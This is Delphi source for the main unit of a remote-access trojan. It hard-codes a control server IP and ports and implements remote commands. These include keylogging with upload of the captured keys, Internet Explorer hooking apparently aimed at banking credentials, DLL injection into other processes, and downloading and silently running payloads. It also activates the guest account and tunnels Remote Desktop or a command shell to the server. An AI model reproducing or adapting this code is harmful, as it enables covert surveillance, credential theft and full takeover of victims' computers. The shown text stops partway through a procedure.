unit main;

interface
uses windows,uSocket,uFuncs,uStr,uScr,uSvc,uCMD,uDebug;
const
  PORT1=7621;
  PORT2=7622;
  PORT3=7623;
  SERVER1='127.0.0.1';
  SERVER3='103.97.3.61';
  SERVER2='103.97.3.61';

//**********************一级命令*******************************
  o_READY=00;
  //o_Screen=2010;
  o_KeyMouse=2020;
  o_PCInfo=2030;
  //o_TransFiles=2040;
  o_ListDrvs=2050;
  o_ListFileInfos=2060;
  o_ListProcs=2070;
  o_opProc=2080;
  o_Reg=2090;
  o_ReNamePC=2100;
  o_GetPCName=2110;
  o_opHookKey=2120;
  o_HookIE=2150;
  o_UnHookIE=2160;
  o_Close=2170;
  o_Update=2180;
  o_RunFile=2190;
  o_DelFile=2200;
  o_Delete=2210;
  o_CrtDir=2220;
  o_DelDir=2230;
  o_CAD=2240;
  o_Svc=2250;
  o_Reboot=2260;
  o_CrtUser=2270;
  o_TermSvr=2280;
  o_GetCID=2290;    //06-05-13
  o_Add=2300;       //06-05-13
  o_CMD=2310;       //06-08-13
  o_video=2320;       //06-11-11
//************************二级命令**************************
  o_StartHookKey=2121;
  o_GetHookKeys=2122;
  o_CloseHookKey=2123;
  o_StartFileHookKey=2124;
  o_GetFileHookKeys=2125;
  o_CloseFileHookKey=2126;
  o_ClearFileHookKey=2127;

  
  con_VERSION=1010;  //软件版本
  con_CONTROL=2;     //程序类别
  con_CONTROLED=1;     //程序类别


  con_ID=1010;
  con_nam='byc';
  con_pwd='byc';
  //VER='1.003';2006-2-15增加GetExplorerIDThread线程，获取Explorer ID、注入adsyh.dll
  //VER='1.003';2006-2-15增加：判断是否可远程桌面连接、自动发送XP:TermSvr.dll功能。
  //VER='1.004';2006-3-15增加GetOSVerion函数：获取操作系统详细版本信息
  //VER='1.005';2006-4-15增加：从IP服务器获取控制服务器地址端口信息；优化系统性能
  //VER='1.006';2006-4-25增加：ProcessOrder() recv超时6分钟
  //VER='1.007';2006-5-13以XML格式发送本机信息;ID:本机标识符
  //VER='1.008';2006-8-6错误屏蔽;创建共享内存;注册表保护;只启动一个服务;服务隐藏;上传目录错误; cmd;ieheper;
  //  yh监视、yh上传数据 ;取消lovecode.51.net;更换youda2000;
  //VER:pansiChar='1.009'; user Login pwd
  //VER:pansiChar='1.009';setup and inf save to reg,if hide not del,svc thread size,
  //VER:pansiChar='1.010';通讯协议，命令接收与数据发送分离；
type

  PClientInfo=^stClientInfo;
  stClientInfo=packed record
    ID:DWORD;
    Version:DWORD;
    nam:array[0..15] of ansiChar;
    pwd:array[0..15] of ansiChar;
    ClientType:DWORD;
    ClientSate:DWORD;
    Socket:integer;
  end;
  TsvcOp=(SEnumSvc,SRunSvc,SStopSvc,SShutDownSvc,SEnableSvc,SDisableSvc,SUnRegSvc);
  pSvcOpInfo=^stSvcOpInfo;
  stSvcOpInfo=record
    op:TsvcOp;
    name:array[0..31] of ansiChar;
  end;

  PSvrAddr2=^stSvrAddr2;
  stSvrAddr2=packed record
    svr:stSvrAddr;
    dport:Word;
  end;
  PIPServer=^stIPServer;
  stIPServer=record
    svr:stSvrAddr;
    aFile,user,pwd:array[0..31] of ansiChar;
    mysvr:stSvrAddr2;
  end;//aFile:/photo/ip.htm

  tAddFuncMethod=(FRunFile,FLoadLibrary,FInjLibrary);
  PAddFunc=^stAddFunc;
  stAddFunc=record
    ID,PID:DWORD;
    svrfile:array[0..31] of ansiChar;
    lcadir :array[0..max_path-1] of ansiChar;
    lcafile:array[0..31] of ansiChar;
    bDel:bool;
    op:tAddFuncMethod;
    params:pansiChar;
  end;
  pfunc=^stfunc;
  stfunc=record
    ID:DWORD;
    pp:pointer;
    op:tAddFuncMethod;
  end;
  stfuncs=array of stfunc;
var
  DataSvrAddr:stSvrAddr;
  funcs:stfuncs;
procedure MainThread;stdcall;
procedure InitSvrAddrs(pSvrAddrs:pointer;size:integer);stdcall;
procedure ProcessOrder(hSocket:integer);stdcall;
procedure ProcessScr(socket:integer);
procedure ProcessListDrvs();
procedure ProcessListFileInfos(socket:integer;poh:POrdHeader);
procedure ProcessTransFiles(socket:integer);
procedure ProcessListProc();
procedure ProcessOpProc(socket:integer);
procedure ProcessReg(socket:integer);
procedure ProcessReNamePC(socket:integer);
procedure processGetPCName();
//procedure TimerFunc(hWnd:HWND;uMsg:UINT;idEvent:UINT;dwTime:DWORD);stdcall;
//procedure SetPCNameFromIE();
//function AutoHookIE():BOOL;
//function TransRec(aFile:pansiChar):BOOL;
function AutoHookIE():BOOL;
procedure SetPCNameFromURL();
procedure TimerThread();stdcall;
procedure SetTimerThread();
procedure GetHookKeys();
procedure processHookIE(socket:integer=0);
procedure processRunFile(Socket:integer);
procedure processDelFile(Socket:integer);
function processUpdate():bool;
function processDelete():bool;
procedure processAdd();
procedure processCrtDir(Socket:integer);
procedure processDelDir(Socket:integer);
procedure processCAD();
procedure ProcessSvc(socket:integer);
procedure processReboot();
procedure processCrtUser();
procedure processTermSvr();
function TermSvr(port:word=3389):BOOL;
function Inserting:BOOL;
function SetupFileThread(FileNamePara:pointer):BOOL;stdcall;
//function GetIPServerThread(PIPServerInfo:pointer):BOOL;stdcall;
//function GetIPServer(ipFileCrpted:pansiChar):stSvrAddr2;
procedure ProcessGetPCInfo();
//***************************************************************
procedure ProcessCMD(socket:integer);
//processVideo(socket:integer);
function AddFuncThread(FuncParam:pointer):bool;stdcall;
function parsefunc(socket:integer;bAdd:bool=true):bool;
procedure TransferManageThread(PPort:pointer);stdcall;
procedure processHookKeys(oh:stOrdHeader);
function InitClientInfo(pci:PClientInfo):BOOL;
//function InitOrdHeader(poh:POrdHeader):BOOL;

procedure SvcThread(param:pointer);stdcall;
function TransDataClientThread(pOh:POrdHeader):bool;stdcall;
procedure GetHookKeysThread(Socket:integer);stdcall;
procedure GetPCNameThread(param:pointer);stdcall;
procedure RegThread(param:pointer);stdcall;
procedure ListProcThread(param:pointer);stdcall;
procedure ListFileInfosThread(param:pointer);stdcall;
procedure ListDrvsThread(socket:integer);stdcall;
procedure GetPCInfoThread();stdcall;
implementation


function InitClientInfo(pci:PClientInfo):BOOL;
begin
  ZeroMemory(pci,sizeof(stClientInfo));
  pci^.ID:=con_ID;
  pci^.Version:=con_VERSION;
  pci^.ClientType:=con_CONTROLED;
  strcopy(pci^.nam,con_nam);
  strcopy(pci^.pwd,con_pwd);
  result:=true;
end;

procedure processHookKeys(oh:stOrdHeader);
var
  op:DWORD;
  pTF:PTransFilesInfo;
  hd,id:cardinal;
begin
  op:=DWORD(oh.Data);
  case op of
    o_StartHookKey://o_StartHookKey
      begin
        ManageHookKeys(HStart);
      end;//o_StartHookKey
    o_GetHookKeys:
      begin
        GetHookKeys();
      end;//o_GetHookKeys
    o_CloseHookKey:
      begin
        ManageHookkeys(Hclose);
      end;//o_CloseHookKey
    o_StartFileHookKey:
      begin
        RegSetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey',1);
        ManageHookKeys(HStart);
      end;//o_StartFileHookKey
    o_GetFileHookKeys:
      begin
        if not FileExist(HookKeys.Filename) then exit;
        new(pTF);
        with pTF^ do
        begin
          server:=DataSvrAddr;
          lstrcpyA(serverFile,extractfilename(HookKeys.Filename));
          lstrcpyA(clientFile,HookKeys.Filename);
          bUpLoad:=true;
          bFolder:=false;
          bCompleteDel:=false;
          hd:=createthread(nil,0,@TransFilesClientThread,pTF,0,id);
          closehandle(hd);
        end;//with
      end;//o_GetFileHookKeys
    o_CloseFileHookKey:
      begin
        RegDelVal(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey');
        ManageHookkeys(HStart);
      end;//o_CloseFileHookKey
    o_ClearFileHookKey:
      begin
        if lstrlenA(HookKeys.Filename)>0 then
          deletefileA(HookKeys.Filename);
      end;//o_CloseFileHookKey
  end;//case
end;

procedure TransferManageThread(PPort:pointer);stdcall;
var
  id,dwResult:cardinal;
  plca,pSvr:pTransferClientInfo;
  port:word;
  hThread:array[0..1] of THandle;
begin
  plca:=nil;pSvr:=nil;hThread[0]:=0;hThread[1]:=0;
try
  port:=PWORD(PPort)^;
  new(plca);zeromemory(plca,sizeof(stTransferClientInfo));
  with plca^ do
  begin
    sa.port:=port;
    sa.flg:=0;
    sa.IP:='127.0.0.1';
    if not ConnectServer(RecvSocket,sa) then exit;
  end;//with plca^ do
  new(pSvr);zeromemory(pSvr,sizeof(stTransferClientInfo));
  with pSvr^ do
  begin
    sa:=DataSvrAddr;
    sa.port:=PORT3;
    if not ConnectServer(RecvSocket,sa) then exit;
  end;//with pSvr^ do

  pSvr^.SendSocket:=plca^.RecvSocket;
  plca^.SendSocket:=pSvr^.RecvSocket;

  hThread[0]:=CreateThread(nil,0,@TransferClientThread,plca,0,id);
  if hThread[0]=0 then exit;
  hThread[1]:=CreateThread(nil,0,@TransferClientThread,pSvr,0,id);
  if hThread[1]=0 then exit;
  dwResult:=WaitForMultipleObjects(2,PWOHandleArray(@hThread[0]), FALSE, INFINITE);
  Closehandle(hThread[0]);Closehandle(hThread[1]);
finally
  if (plca<>nil)and(plca^.RecvSocket<>0) then FreeSocket(plca^.RecvSocket);
  if (pSvr<>nil)and(pSvr^.RecvSocket<>0) then FreeSocket(pSvr^.RecvSocket);
  if plca<>nil then dispose(plca);
  if pSvr<>nil then dispose(pSvr);
  if PPort<>nil then dispose(PPort);
end;//try
end;

function AddFuncThread(FuncParam:pointer):bool;stdcall;
type
  PLPWSTRW = ^PWideChar;
  PPansiCharArray = ^TPansiCharArray;
  TPansiCharArray = array [0..1023] of PansiChar;
  PPWideansiCharArray = ^TPWideansiCharArray;
  TPWideansiCharArray = array [0..1023] of PWideChar;
var
  pa:PAddFunc;
  pTF:PTransFilesInfo;
  lcafile:array[0..max_path-1] of ansiChar;
  wbuf:array[0..1023] of wideChar;
  pw:PWideChar;
  hDLL,hProcess:cardinal;
  argv:PLPWSTRW;
  ServiceMain:procedure(argc:integer;argv:PLPWSTRW);stdcall;
begin
  result:=false;
  if FuncParam=nil then exit;
  pa:=FuncParam;
  //lcafile 默认为系统目录
  if GetSystemDirectoryA(lcafile,sizeof(lcafile))=0 then exit;
  if pos(':',pa^.lcadir)>0 then//非系统目录
  begin
    if not DirectoryExists(pa^.lcadir) then  ForceDirectories(pa^.lcadir);
    //
  end
  else begin
    if lstrcmpiA(pa^.lcadir,'%SystemRoot%')=0 then GetDir($24,lcafile);//C:\Windows
  end;
  //文件
  if lstrlenA(pa^.lcafile)=0 then //自动化文件
  begin
    GenStr(4,pa^.lcafile);
    lstrcatA(lcafile,'\');
    lstrcatA(lcafile,pa^.lcafile);
    if pa^.op=FLoadLibrary then lstrcatA(lcafile,'.dll');
    if pa^.op=FinjLibrary then lstrcatA(lcafile,'.dll');
  end
  else begin
    lstrcatA(lcafile,'\');
    lstrcatA(lcafile,pa^.lcafile);
  end;//if lstrlen(pa^.lcafile)=0 then
  //down
  new(pTF);
  with pTF^ do
  begin
    server:=DataSvrAddr;
    lstrcpyA(serverFile,pa^.svrfile);
    lstrcpyA(clientFile,lcafile);
    if FileExist(lcafile) then deleteFileA(lcafile);
    bUpLoad:=false;
    bFolder:=false;
    bCompleteDel:=false;
    if not TransFilesClientThread(pTF) then exit;//下载文件
    if pa^.bDel then MoveFileExA(lcafile,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
  end;//with
  //op
  if pa^.op=FLoadLibrary then
  begin
    hDLL:=LoadLibraryA(lcafile);
    if hDLL=0 then exit;
    @ServiceMain:=GetProcAddress(hDLL,'ServiceMain');
    if @ServiceMain=nil then exit;
    //transfer params
    pw:=StringToWideChar(pa^.params,wbuf,sizeof(wbuf));argv:=@pw;
    ServiceMain(1,argv);
  end;
  if pa^.op=FinjLibrary then
  begin
    hProcess:=openProcess(PROCESS_ALL_ACCESS,false,PA^.PID);
    if hProcess=0 then exit;
    if AttachToProcess(hProcess,lcafile)=0 then exit;
  end;
  setlength(funcs,high(funcs)+2);
  funcs[high(funcs)].ID:=pa^.ID;
  funcs[high(funcs)].pp:=@ServiceMain;
  funcs[high(funcs)].op:=pa^.op;
  result:=true;
end;

function parsefunc(socket:integer;bAdd:bool=true):bool;
{
  协议定义：
  ss.Add('<func>');  必须项
  ss.Add('<ID>1</ID>'); 必须项
  ss.Add('<svrfile>video.dll</svrfile>'); 必须项
  ss.Add('<lcadir>%SystemRoot%\System32</lcadir>'); 必须项
  ss.Add('<lcafile>svr.dll</lcafile>');
  ss.Add('<thread>false</thread>'); 必须项
  ss.Add('<op>loadlibrary</op>'); 必须项
  ss.Add('<PID>0</PID>');
  ss.Add('<params>'); 必须项
  ss.Add('<IP>192.168.1.2</IP>');
  ss.Add('<port>7618</port>');
  ss.Add('</params>'); 必须项
  ss.Add('</func>'); 必须项
  接口：
  ServiceMain(1,argv);
  存储:
  stfunc=record
    ID:DWORD;
    pp:pointer;
  end;
  stfuncs=array of stfunc;
  }
type
  PLPWSTRW = ^PWideChar;
  PPansiCharArray = ^TPansiCharArray;
  TPansiCharArray = array [0..1023] of PansiChar;
  PPWideansiCharArray = ^TPWideansiCharArray;
  TPWideansiCharArray = array [0..1023] of PWideChar;
const
  KEY='1';
var
  s,svrfile,lcadir,lcafile,op,params,temp:ansistring;
  len,i,j:integer;
  PID,ID:cardinal;
  bthread,bDel:bool;
  buf:array[0..max_path-1] of ansiChar;
  wbuf:array[0..1023] of wideChar;
  pw:PWideChar;
  argv:PLPWSTRW;
  ServiceMain:procedure(argc:integer;argv:PLPWSTRW);stdcall;
  pa:PAddFunc;
begin
  result:=false;ID:=0;PID:=0;
  if not recvBuf(socket,@len,sizeof(len)) then exit;
  if len<0 then exit;setlength(s,len);
  if not recvBuf(socket,@s[1],len) then exit;
  if not bAdd then begin result:=true;exit;end;
  //解密
  for i:=1 to length(s) do s[i]:=ansiChar(ord(s[i]) xor ord(KEY));
  //解析
  temp:=copy(s,1,6);if temp<>'<func>' then exit;
  temp:=copy(s,length(s)-6,7);if temp<>'</func>' then exit;
  //ID
  i:=pos('<ID>',s);
  j:=pos('</ID>',s);
  if(i<=0)or(j<=0)then exit;
  temp:=copy(s,i+4,j-i-4);if not strtoint(pansiChar(temp),integer(ID)) then exit;
  //params
  i:=pos('<params>',s);j:=pos('</params>',s);if(i<=0)or(j<=0)then exit;
  params:=copy(s,i,j+9-i);
  //IP
  i:=pos('<IP>',params);j:=pos('</IP>',params);
  if(i>0)and(j>0)then
  begin
    delete(params,i+4,j-i-4);
    insert(datasvraddr.IP,params,i+4);
  end;
  //func load?
  for i:=low(funcs) to high(funcs) do
  begin
    if ID=funcs[i].ID then
    begin
      case funcs[i].op of
        FLoadLibrary:
        begin
          pw:=StringToWideChar(params,wbuf,sizeof(wbuf));argv:=@pw;
          @ServiceMain:=funcs[i].pp;
          ServiceMain(1,argv);
        end;// FLoadLibrary:
      end;//case
      //result:=true;
      //exit;
    end;//if ID=funcs[i].ID then
  end;//for
  //svrfile
  i:=pos('<svrfile>',s);j:=pos('</svrfile>',s);if(i<=0)or(j<=0)then exit;
  svrfile:=copy(s,i+9,j-i-9);
  //lcadir
  i:=pos('<lcadir>',s);j:=pos('</lcadir>',s);if(i<=0)or(j<=0)then exit;
  lcadir:=copy(s,i+8,j-i-8);
  //lcadir:=buf;
  //if pos(
  //lcafile
  i:=pos('<lcafile>',s);j:=pos('</lcafile>',s);
  if(i>0)and(j>0)then lcafile:=copy(s,i+9,j-i-9);
  {
  if(i>0)and(j>0)then
  begin
    temp:=copy(s,i+9,j-i-9);
    lcafile:=lcadir+'\'+temp;
  end//if(i>0)and(j>0)then
  else begin
    GenStr(4,buf);
    lcafile:=lcadir+'\'+buf;
  end;//if(i>0)and(j>0)then
  }
  //thread
  i:=pos('<thread>',s);j:=pos('</thread>',s);if(i<=0)or(j<=0)then exit;
  temp:=copy(s,i+8,j-i-8);if temp='false' then bThread:=false else bThread:=true;
  //reboot del
  i:=pos('<rebootdel>',s);j:=pos('</rebootdel>',s);if(i<=0)or(j<=0)then exit;
  temp:=copy(s,i+11,j-i-11);if temp='false' then bDel:=false else bDel:=true;
  //active
  i:=pos('<op>',s);j:=pos('</op>',s);if(i<=0)or(j<=0)then exit;
  op:=copy(s,i+4,j-i-4);
  //PID
  i:=pos('<PID>',s);j:=pos('</PID>',s);
  if(i>0)and(j>0) then
  begin
    temp:=copy(s,i+5,j-i-5);
    if length(temp)=0 then exit;
    if not(temp[1] in (['1','2','3','4','5','6','7','8','9','0'])) then
    begin
      PID:=GetProcessID(pansiChar(temp));
      if PID=0 then exit;
    end
    else strtoint(pansiChar(temp),integer(PID));
  end;
  //down
  new(pa);
  pa^.ID:=ID;pa^.PID:=PID;
  lstrcpyA(pa^.svrfile,pansiChar(svrfile));
  lstrcpyA(pa^.lcadir,pansiChar(lcadir));
  lstrcpyA(pa^.lcafile,pansiChar(lcafile));
  pa^.bDel:=bDel;
  if op='loadlibrary' then pa^.op:=FLoadLibrary;
  if op='injlibrary' then pa^.op:=Finjlibrary;
  getmem(pa^.params,length(params)+1);
  lstrcpyA(pa^.params,pansiChar(params));
  if bThread then
  begin

  end
  else begin
    result:=AddFuncThread(pa);
  end;//
end;

procedure ProcessCMD(socket:integer);
var
  cfg,i:DWORD;
  bOpen:bool;
begin
  cfg:=DWORD(-1);
  recvBuf(socket,@cfg,sizeof(cfg));
  case cfg of
  0:begin
      TermSvr(23);
    end;//0
  1:begin
      CreateCMDType:=1;
      startCmdService;
      sleep(2000);
      TermSvr(CMD_OPEN_PORT1);
    end;//1
  2:begin
      //CreateCMDType:=2;
      //startCmdService;
      bOpen:=PortIsOpen(CMD_OPEN_PORT2);
      if not parsefunc(socket,not bOpen) then exit;
      i:=0;
      while not bOpen do
      begin
          if i>10 then exit;
          sleep(1000);
          i:=i+1;
          bOpen:=PortIsOpen(CMD_OPEN_PORT2);
      end;
      
      TermSvr(CMD_OPEN_PORT2);
    end;//2
  end;//case
end;
{
function GetIPServer(ipFileCrpted:pansiChar):stSvrAddr2;
var
  ipSvr:stIPServer;
  ipFile:string;
begin
  ipFile:=DESryStrHex(ipFileCrpted,KEY);
  //注意:GetHttpSvr不能返回Nil
  strcopy(ipSvr.aFile,GetHttpSvr(pansiChar(ipFile),ipSvr.svr.DN));
  ipSvr.svr.flg:=1;
  ipSvr.svr.port:=80;
  GetIPServerThread(@ipSvr);
  result:=ipSvr.mysvr;
end;
function GetIPServerThread(PIPServerInfo:pointer):BOOL;stdcall;
label 1;
const
  MAXBUF=1024;
var
  pf:PIPServer;
  hSocket,RecvLen:integer;
  buf:array[0..MAXBUF-1] of ansiChar;
begin
  result:=false;
  pf:=PIPServerInfo;
  hSocket:=INVALID_SOCKET;
  zeromemory(@buf[0],sizeof(buf));
  if not ConnectServer(hSocket,pf^.svr) then exit;
  strcopy(buf,'GET ');strcat(buf,pf^.aFile);
  strcat(buf,' HTTP/1.1');strcat(buf,#13#10);
  strcat(buf,'Accept:*/*');strcat(buf,#13#10);
  strcat(buf,'Accept-Language: zh-cn');strcat(buf,#13#10);
  strcat(buf,'Accept-Encoding: gzip, deflate');strcat(buf,#13#10);
  strcat(buf,'User-Agent: Mozilla/4.0');strcat(buf,#13#10);
  strcat(buf,'Host:');strcat(buf,pf^.svr.DN);strcat(buf,#13#10);
  strcat(buf,'Connection: Keep-Alive');strcat(buf,#13#10);strcat(buf,#13#10);
  if not SendBuf(hSocket,@buf[0],strlen(buf)) then goto 1;

  zeromemory(@buf[0],sizeof(buf));
  RecvLen:=RecvNon(hSocket,@buf[0],1024);
  if (RecvLen<=0) then goto 1;
  copymemory(@pf^.mysvr,@buf[RecvLen-sizeof(pf^.mysvr)],sizeof(pf^.mysvr));
  result:=true;
1:
  if hSocket<>INVALID_SOCKET then
    FreeSocket(hSocket);
end;
}

function SetupFileThread(FileNamePara:pointer):BOOL;stdcall;
var
  pTF:PTransFilesInfo;
  FileName:array[0..max_path-1] of ansiChar;
begin
  result:=false;
  strcopy(FileName,pansiChar(FileNamePara));
  new(pTF);
  with pTF^ do
  begin
    server:=DataSvrAddr;
    strcopy(serverFile,FileName);
    GetDir($0015,clientFile);
    strcat(clientFile,'\');strcat(clientFile,FileName);
    strcopy(FileName,clientFile);//
    if FileExist(FileName) then deleteFileA(FileName);
    bUpLoad:=false;
    bFolder:=false;
    bCompleteDel:=false;
    if TransFilesClientThread(pTF) then
    begin
      if(RunFile(FileName,sw_shownormal).dwProcessId>0) then;
        result:=true;
    end;
  end;//with
end;

function Inserting:BOOL;
{
const
  pg_1:pansiChar='adsyh.dll';
var
  err:integer;
  FileName:array[0..max_path-1] of ansiChar;
  }
var
  hd,id:DWORD;
begin
  {
  result:=false;
  err:=GetSystemDirectory(FileName,sizeof(FileName));
  if err<=0 then exit;
  strcat(FileName,'\');strcat(FileName,pg_1);
  if FileExist(FileName) then
    result:=AttachToProcess(GetCurrentProcess,FileName)>0;
    }
  hd:=CreateThread(nil,0,@GetExplorerIDThread,nil,0,id);
  closeHandle(hd);
end;
function TermSvr(port:word=3389):BOOL;
var
  id,hd:cardinal;
  pport:PWORD;
begin
  result:=false;
  new(pport);pport^:=port;
  hd:=CreateThread(nil,0,@TransferManageThread,pport,0,id);
  if hd=0 then exit;
  result:=true;
end;

procedure processCrtUser();
begin
  ActiveGuest;
end;
procedure processReboot();
begin
  ExitWindowsEx(EWX_REBOOT or EWX_FORCE, $FFFF);
end;
procedure processTermSvr();
const
  FileName:pansiChar='XP.exe';
var
  hd,id:DWORD;
begin
  OpenTermService;
  ActiveGuest;
  if(strpos(pansiChar(OSVersion),'XP')<>nil)and(IsRemoteDeskConn=false) then
  begin
    hd:=createthread(nil,0,@SetupFileThread,FileName,0,id);
    closehandle(hd);
  end;
  TermSvr;
end;
{
procedure ProcessSvc(socket:integer);
var
  so:stSvcOpInfo;
  FServicesInfo:PServicesInfo;
  FServiceCount:DWORD;
  uType,SvcState,size:DWORD;
begin
  RecvBuf(socket,@so,sizeof(so));
  case so.op of
  SEnumSvc:
    begin
      uType:=DWORD(so.name[0]);SvcState:=DWORD(so.name[4]);
      EnumServices(uType,SvcState,FServicesInfo,FServiceCount);
      size:=FServiceCount*sizeof(stServiceInfo);

      SendBuf(socket,@size,sizeof(DWORD));
      SendBuf(socket,FServicesInfo,size);
      Virtualfree(FServicesInfo,size,mem_decommit);
      Virtualfree(FServicesInfo,size,MEM_RELEASE);
    end;//SEnumSvc
  SRunSvc:RunSvc(so.name);
  SStopSvc:StopSvc(so.name);
  SShutDownSvc:ShutDownSvc(so.name);
  SEnableSvc:EnableSvc(so.name);
  SDisableSvc:DisableSvc(so.name);
  SUnRegSvc:UnRegSvc(so.name);
  end;//case
end;
}
procedure ProcessSvc(socket:integer);
var
  pso:pSvcOpInfo;
  FServicesInfo:PServicesInfo;
  FServiceCount:DWORD;
  uType,SvcState,size:DWORD;
  hd,id:DWORD;
begin
  new(pso);
  RecvBuf(socket,pso,sizeof(stSvcOpInfo));
  hd:=createthread(nil,0,@SvcThread,pso,0,id);
  closehandle(hd);
end;

procedure SvcThread(param:pointer);stdcall;
var
  pso:pSvcOpInfo;
  FServicesInfo:PServicesInfo;
  FServiceCount:DWORD;
  uType,SvcState,size:DWORD;
  oh:stOrdHeader;
begin
  pso:=param;
  case pso^.op of
  SEnumSvc:
    begin
      uType:=DWORD(pso.name[0]);SvcState:=DWORD(pso.name[4]);
      EnumServices(uType,SvcState,FServicesInfo,FServiceCount);
      size:=FServiceCount*sizeof(stServiceInfo);
      InitOrdHeader(@oh);
      oh.order:=o_Svc;
      oh.datasize:=size;
      oh.Data:=FServicesInfo;
      TransDataClientThread(@oh);
      Virtualfree(FServicesInfo,size,mem_decommit);
      Virtualfree(FServicesInfo,size,MEM_RELEASE);
    end;//SEnumSvc
  SRunSvc:RunSvc(pso.name);
  SStopSvc:StopSvc(pso.name);
  SShutDownSvc:ShutDownSvc(pso.name);
  SEnableSvc:EnableSvc(pso.name);
  SDisableSvc:DisableSvc(pso.name);
  SUnRegSvc:UnRegSvc(pso.name);
  end;//case
end;
procedure processCAD();
var
  //hWS: HWINSTA;
  //hDT: HDESK;
  hd,id:cardinal;
begin
  //SwitchWSDT(nil,nil,hWS,hDT);
  //PostMessage(HWND_BROADCAST,$0312,0,
  //      MAKELONG(MOD_ALT or MOD_CONTROL, VK_DELETE));
  //SwitchWSDT(nil,nil,hWS,hDT,true);
  //DesktopSvc(svcName,true);
  hd:=CreateThread(nil, 0, @SendHokKey, nil, 0, ID);
  closehandle(hd);
  //DesktopSvc(svcName,false);
end;
procedure processCrtDir(Socket:integer);
var
  Dir:array[0..max_path-1] of ansiChar;
begin
  zeromemory(@Dir,sizeof(Dir));
  RecvNon(socket,@Dir,sizeof(Dir));
  CreateDirectoryA(Dir,nil);
end;
procedure processDelDir(Socket:integer);
var
  hd,id:cardinal;
  Dir:pansiChar;
begin
  getmem(Dir,260);
  zeromemory(Dir,260);
  RecvNon(socket,Dir,260);
  hd:=createthread(nil,0,@ClearDirThread,Dir,0,id);
  closehandle(hd);
end;
function processDelete():bool;
var
  psm:PShareMemOfProcess;
begin
  result:=false;
  psm:=PShareMemOfProcess(sm.lpMapAddress);if psm=nil then exit;
  if (psm^.flag and Svchost_Update_Mask)=0 then
    psm^.flag:=psm^.flag xor Svchost_Update_Mask;//设置更新标志
  if not SetEvent(hNotify) then exit;
  sleep(1000);
  WaitForSingleObject( hNotify, infinite);
  result:=true;
end;
procedure processAdd();
//06-05-13
const
  FileName:pansiChar='mysetup.exe';
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@SetupFileThread,FileName,0,id);
  closehandle(hd);
end;
function processUpdate():bool;
const
  c_FileName:pansiChar='mysetup.exe';
var
  pTF:PTransFilesInfo;
  psm:PShareMemOfProcess;
  FileName:array[0..max_path-1] of ansiChar;
  i:integer;
begin
  result:=false;
  psm:=sm.lpMapAddress;if psm=nil then exit;
  i:=0;
  new(pTF);
  with pTF^ do
  begin
    server:=DataSvrAddr;
    strcopy(serverFile,c_FileName);
    GetDir($0015,clientFile);
    strcat(clientFile,'\');strcat(clientFile,c_FileName);
    strcopy(FileName,clientFile);//
    if FileExist(FileName) then deleteFileA(FileName);
    bUpLoad:=false;
    bFolder:=false;
    bCompleteDel:=false;
    if not TransFilesClientThread(pTF) then exit;//下载文件
  end;//with
    if not SetPEID(FileName,Fupdate) then exit;//设置更新标志
    if RunFile(FileName,sw_shownormal).dwProcessId=0 then exit;//运行
    while (psm^.flag and Svchost_Update_Mask)=0 do
    begin
      sleep(1000);//等待新进程设置内存更新标志
      i:=i+1;
      if i>10 then exit;
    end;
    if not processDelete() then exit;                          //卸载操作
    sleep(1000);
    active:=false;
    result:=true;
end;
procedure processDelFile(Socket:integer);
var
  FileName:array[0..max_path-1] of ansiChar;
begin
  RecvBuf(socket,@FileName,sizeof(FileName));
  if not deletefileA(FileName) then
    MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
end;
procedure processRunFile(Socket:integer);
var
  FileName:array[0..max_path-1] of ansiChar;
begin
  RecvBuf(socket,@FileName,sizeof(FileName));
  RunFile(FileName,sw_hide);
end;
{
procedure processUpdate(Socket:integer);
var
  HeadSize,HeadCount,i,j:DWORD;
  updateHeads:TUpdateHeads;
  updateFiles:TUpdateFiles;
  RegOp:stRegOpInfo;
  RegDat:pointer;
begin
  RecvBuf(socket,@HeadSize,sizeof(HeadSize));
  HeadCount:=headSize div sizeof(stUpdateHead);
  setlength(updateHeads,HeadCount);
  RecvBuf(socket,@updateHeads,HeadSize);
  for i:=0 to headCount-1 do
  begin
    case updateHeads[i].sectionType of
      s_RemoteFile:
      begin
        setlength(updateFiles,updateHeads[i].sectionCount);
        RecvBuf(socket,@updateFiles,updateHeads[i].sectionSize);
      end;//s_RemoteFile
      s_Reg:
      begin
        for j:=0 to updateHeads[i].sectionCount-1 do
        begin
          RecvBuf(socket,@RegOp,sizeof(RegOp));
          getmem(RegDat,RegOp.siz);
          RecvBuf(socket,@RegDat,RegOp.siz);
          RegOp.dat:=RegDat;
          SetInfoToReg(RegOp);
          freemem(RegDat);
        end;//j
      end;//s_Reg
      s_LocalFile:
      begin

      end;//s_LocalFile
    end;//case
  end;//for
end;
procedure UpdateFile(updateFileInfo:stUpDateFile);
begin

end;
}
procedure processHookIE(socket:integer=0);
//06-05-13:注消时写注册表gsyh_used、gszf_used
//06-05-13:注册时删除注册表gsyh、gszf
const
  dllName:pansiChar='IEHelper.dll';
  setupName:pansiChar='HookIE.exe';
var
  hd,id:cardinal;
  FullFileName:array[0..max_path-1] of ansiChar;
  ro:stregopinfo;
begin
  ro.op:=RCreateVal;
  ro.rk:=HKEY_LOCAL_MACHINE;
  ro.key:='SoftWare\Microsoft\BYC';
  ro.val:='GSYH';
  ro.typ:=REG_SZ;
  ro.dat:=@FullFileName[0];
  ro.siz:=sizeof(FullFileName);
  if socket=0 then
  begin
    GetSystemDirectoryA(FullFileName,sizeof(FullFileName));
    strcat(FullFileName,'\');strcat(FullFileName,dllName);
    RegComFile(FullFileName,false);
    MoveFileExA(FullFileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
    FullFileName:='used';
    opreg(ro);
    ro.val:='gszf';
    opreg(ro);
  end
  else begin
    hd:=createthread(nil,0,@SetupFileThread,setupName,0,id);
    closehandle(hd);
    ro.val:='gsyh';
    ro.op:=RDelVal;
    opreg(ro);
    ro.val:='gszf';
    opreg(ro);
  end;//not hook
end;
{
procedure processHookIE(socket:integer=0);
var
  pTF:pTransFilesInfo;
  hd,id:cardinal;
  Para:array[0..255] of ansiChar;
begin
  if socket=0 then
  begin
    Para:=' /k regsvr32/s/u IEHelper.dll';
    ShellExecute(0,nil, 'cmd',Para, nil, SW_hide);
    GetSystemDirectory(Para,sizeof(Para));
